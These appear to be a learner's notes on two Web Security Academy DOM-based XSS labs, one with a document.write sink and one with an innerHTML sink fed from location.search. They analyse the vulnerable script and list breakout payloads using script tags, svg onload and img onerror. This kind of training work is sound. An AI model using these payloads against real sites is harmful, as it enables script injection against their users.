## Lab1: The param is being read from the URL and insert into document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">')

document.write sink using source location.search
URL - https://0ac100d10477af868006e069001500a7.web-security-academy.net/?search=%27%3C%2Fh1%3E%3Cb%3Exxxx%3C%2Fb%3E
param = search
query = %27%3C%2Fh1%3E%3Cb%3Exxxx%3C%2Fb%3E = '</h1><b>xxxx</b>
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
encoding is implemented

break out of img tag
'">');<b>xxxx</b>  ----> ');xxxx"> getting printed

# payload: 
'"><script>alert('xxxxxx')</script>
"><svg onload=alert(1)>

## Lab2 : innerHTML sink using source location.search
  <script>
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        doSearchQuery(query);
    }
</script>                         

* payload:
<b>Hello<b>
');//<img src=x onerror=print('xxx')>

* Output
= <span id="searchMessage"><b>hello</b></span>

## The value of the src attribute is invalid and throws an error. This triggers the onerror event handler, which then calls the alert() function. As a result, the payload is executed whenever the user's browser attempts to load the page containing your malicious post.



